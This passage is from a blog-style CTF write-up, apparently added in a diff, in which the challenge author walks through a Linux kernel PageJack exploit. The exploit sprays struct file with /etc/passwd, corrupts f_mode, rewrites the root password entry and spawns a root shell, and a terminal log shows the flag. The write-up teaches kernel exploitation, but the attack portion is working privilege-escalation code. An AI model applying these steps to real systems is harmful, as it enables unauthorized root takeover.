+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>			f_iocb_flags;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> cred		<span style="color:#f92672">*</span>f_cred;
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/* --- cacheline 1 boundary (64 bytes) --- */</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> path			f_path;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">union</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">/* regular files (with FMODE_ATOMIC_POS) and directories */</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">struct</span> mutex		f_pos_lock;
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">/* pipes */</span>
+</span></span><span style="display:flex;"><span>		u64			f_pipe;
+</span></span><span style="display:flex;"><span>	};
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">loff_t</span>				f_pos;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef CONFIG_SECURITY
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">void</span>				<span style="color:#f92672">*</span>f_security;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">/* --- cacheline 2 boundary (128 bytes) --- */</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> fown_struct		<span style="color:#f92672">*</span>f_owner;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">errseq_t</span>			f_wb_err;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">errseq_t</span>			f_sb_err;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef CONFIG_EPOLL
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">struct</span> hlist_head		<span style="color:#f92672">*</span>f_ep;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">union</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">struct</span> callback_head	f_task_work;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">struct</span> llist_node	f_llist;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">struct</span> file_ra_state	f_ra;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">freeptr_t</span>		f_freeptr;
+</span></span><span style="display:flex;"><span>	};
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/* --- cacheline 3 boundary (192 bytes) --- */</span>
+</span></span><span style="display:flex;"><span>} __randomize_layout
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__attribute__</span>((<span style="color:#a6e22e">aligned</span>(<span style="color:#ae81ff">4</span>)));	<span style="color:#75715e">/* lest something weird decides that 2 is OK */</span>
+</span></span></code></pre></div><p>First, we will spray struct file by opening /etc/passwd many times:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Spray /etc/passwd
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_FILES; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        filefd[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/etc/passwd&#34;</span>, O_RDONLY);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (filefd[i] <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] file open&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>); 
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>Then, we will corrupt f_mode by writing to the other pipe which contains a pointer to the victim page:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> f_mode <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x480e801f</span>; 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Overwrite f_mode</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">write</span>(pipefd[corrupted_pipe_2][<span style="color:#ae81ff">1</span>], <span style="color:#f92672">&amp;</span>f_mode, <span style="color:#ae81ff">4</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] write&#34;</span>); 
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>); 
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p><img src="/images/utilitypole-revengeance/heap4.jpg" alt="heapy heap heapy heap"></p>
+<p>Something to note that is that the offset of f_mode in struct file is 0xc. Note that in the pipe spray section of the exploit, we have written a total of 0xc bytes (4 for the index used to identify the corrupted pipe and 8 &ldquo;A&quot;s) to the pipe &ndash; this is such that when we overwrite f_mode, it will continue writing to the page at offset 0xc and hence corrupt the region of the struct that we want.</p>
+<p>Finally, as /etc/passwd is now writable, we can set the root password to whatever we want:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Overwrite /etc/passwd
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> passwd[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;root:$1$ropllc$IIMFfZVFOxSobsxG9DyYu1:0:0:root:/root:/bin/sh</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Overwrite /etc/passwd</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_FILES; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">write</span>(filefd[i], passwd, <span style="color:#66d9ef">sizeof</span>(passwd)) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Creds: root:jack</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[] <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;/bin/bash&#34;</span>, NULL};
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">execve</span>(argv[<span style="color:#ae81ff">0</span>], argv, NULL);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>Now, all that we need to do is to su to the root user and profit!</p>
+<pre tabindex="0"><code>jack@ropllc:~$ /exploit 
+STAGE 1: SETUP
+[+] Opening device
+STAGE 2: PAGEJACK
+[+] Spraying half of the pipefds
+[+] Performed create
+[+] Spraying half of the pipefds
+[+] Trigger vulnerability
+[+] Performed write
+[+] Find corrupted pipe
+[+] Found corrupted pipes: 0x1b and 0x47
+[+] Get UAF on the page
+[+] IT&#39;S PWN TIME!!!
+[+] Overwrite f_mode
+[+] Overwrite /etc/passwd
+[+] Creds: root:jack
+jack@ropllc:/home/jack$ su root
+Password: 
+# whoami
+root
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /dev/sdb
+LNC25{I_7H1nK_1T5_t1m3_f07_J4Ck_t0_L37_3R_r1P!!}
+</code></pre><p>Hope that you guys enjoyed the challenge! :D</p>
+<h4 id="my-favourite-challenge">My Favourite Challenge</h4>
+<p>I would also like to take this moment to give a shout out to my absolute favourite challenge (written by <a href="https://github.com/Kairos-T">Kairos</a>) in this CTF, which I believe is of <del>insane</del> <strong>impossible</strong> difficulty:</p>
+<blockquote>
+<p>its time you look away from your screen and touch some REAL GRASS!
+take a picture of you making an &ldquo;L&rdquo; with your hand and using it to touch some grass, then open a ticket with that pic to get the flag :)
+sample pic given below (leftmost in the collage below)</p></blockquote>
+<p>Here are some responses that we got (including fake grass and AI generated grass 💀💀💀):</p>
+<p><img src="/images/utilitypole-revengeance/grass.jpg" alt="Grassssss"></p>
+<h4 id="references-and-credits">References and Credits</h4>
+<ol>
+<li><a href="https://github.com/arttnba3/D3CTF2023_d3kcache">https://github.com/arttnba3/D3CTF2023_d3kcache</a> (Original PageJack CTF challenge)</li>
+<li><a href="https://i.blackhat.com/BH-US-24/Presentations/US24-Qian-PageJack-A-Powerful-Exploit-Technique-With-Page-Level-UAF-Thursday.pdf">https://i.blackhat.com/BH-US-24/Presentations/US24-Qian-PageJack-A-Powerful-Exploit-Technique-With-Page-Level-UAF-Thursday.pdf</a> (PageJack paper)</li>
+<li><a href="https://terawhiz.github.io/2025/2/oob-write-to-page-uaf-lactf-2025/">https://terawhiz.github.io/2025/2/oob-write-to-page-uaf-lactf-2025/</a> (PageJack with struct cred)</li>
+<li><a href="https://r1ru.github.io/posts/6/">https://r1ru.github.io/posts/6/</a> (Check out his kernel pwn series!!)</li>
+<li>Lambda for Utility Pole: Revenge (Pt. 1)</li>
+<li>Lambda and Cryptsaria for listening to me ramble about kpwn and MGR</li>
+<li>Metal Gear Rising: Revengeance (goated)</li>
+</ol>
+
+    <h4><a href="https://kaligulaarmblessed.github.io/">Back to Home</a></h4>
+</div>
+
+
+        </div><footer class="container">
+    <hr class="soften">
+    <p>
+&copy; 
+
+    Kaligula Armblessed
+
+<span id="thisyear">2025</span>
+
+
+        | Built on <a href="//gohugo.io" target="_blank">Hugo</a>
+
+</p>
+    <p class="text-center">
+        
+        <a href="https://twitter.com/KaligulaSec">Twitter</a> 
+        
+        <a href="https://github.com/KaligulaArmblessed">GitHub</a> 
+        
+    </p>
+</footer>
+
+</body><link rel="stylesheet" href="/css/bootstrap.css">
+<link rel="stylesheet" href="/css/bootstrap-responsive.css">
+<link rel="stylesheet" href="/css/style.css">
+
+<script src="/js/jquery.js"></script>
+<script src="/js/bootstrap-386.js"></script>
+<script src="/js/bootstrap-transition.js"></script>
+<script src="/js/bootstrap-alert.js"></script>
+<script src="/js/bootstrap-modal.js"></script>
+<script src="/js/bootstrap-dropdown.js"></script>
+<script src="/js/bootstrap-scrollspy.js"></script>
+<script src="/js/bootstrap-tab.js"></script>
+<script src="/js/bootstrap-tooltip.js"></script>
+<script src="/js/bootstrap-popover.js"></script>
+<script src="/js/bootstrap-button.js"></script>
+<script src="/js/bootstrap-collapse.js"></script>
+<script src="/js/bootstrap-carousel.js"></script>
+<script src="/js/bootstrap-typeahead.js"></script>
+<script src="/js/bootstrap-affix.js"></script>
+<script>
+    _386 = { 
+        fastLoad: false ,
+        onePass: true , 
+        speedFactor: 1 
+    };
+
+    
+    function ThisYear() {
+        document.getElementById('thisyear').innerHTML = new Date().getFullYear();
+    };
+</script></html>
